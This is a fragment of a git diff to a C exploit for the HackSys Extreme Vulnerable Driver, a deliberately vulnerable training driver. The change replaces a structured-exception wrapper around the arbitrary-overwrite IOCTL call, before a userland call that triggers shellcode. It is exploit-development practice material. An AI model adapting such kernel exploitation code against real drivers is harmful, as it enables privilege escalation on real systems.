@@ -105,15 +105,9 @@ int main()
 
         printf("[+] Sending buffer to IOCTL: 0x%p...\n", HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE);
 
-        // not sure why but without the __try __except the exploit crashes
-        __try
-        {
-            // interact with the driver
-            DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, (LPVOID)&ArbitraryWrite, sizeof(ArbitraryWrite), NULL, 0, NULL, NULL);
-        }
-        __except (EXCEPTION_EXECUTE_HANDLER) {
-            
-        }
+        // interact with the driver
+        DWORD lpBytesReturned = 0;
+        BOOL result = DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, &ArbitraryWrite, sizeof(ArbitraryWrite), NULL, 0, &lpBytesReturned, NULL);
 
         // make the userland call to trigger our shellcode
         ULONG dummy = 0;
